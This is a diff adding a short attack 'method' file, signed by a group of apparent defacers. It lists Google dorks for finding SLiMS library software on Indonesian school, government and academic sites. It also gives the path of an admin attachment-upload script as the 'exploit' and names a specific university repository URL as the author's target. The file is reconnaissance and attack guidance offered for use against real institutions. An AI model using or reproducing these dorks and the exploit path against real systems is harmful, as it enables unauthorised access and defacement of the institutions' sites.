@@ -1,0 +1,20 @@
+Assalamu alaikum
+Method shere by { h0rn3t sp1d3rs, Mr R013X 400, Mr.999plus }
+
+Dork ==>
+inurl:''index.php?p=show_detail&id='' site:id
+inurl:''/slims5-meranti/'' site:id
+inurl:''/perpustakaan/repository/'' site:id
+inurl:''/index.php?select_lang='' site:sch.id
+inurl:''/index.php?select_lang='' site:go.id
+inurl:''index.php?p=show_detail&id=''
+inurl:''/slims5-meranti/'' site:id  
+Powered by SLiMS site:id
+
+
+Exploit ==>
+/admin/modules/bibliography/popbibliography_attach.php
+
+
+My target site ==>
+https://repository.akfarsam.ac.id/admin/modules/bibliography/pop_attach.php
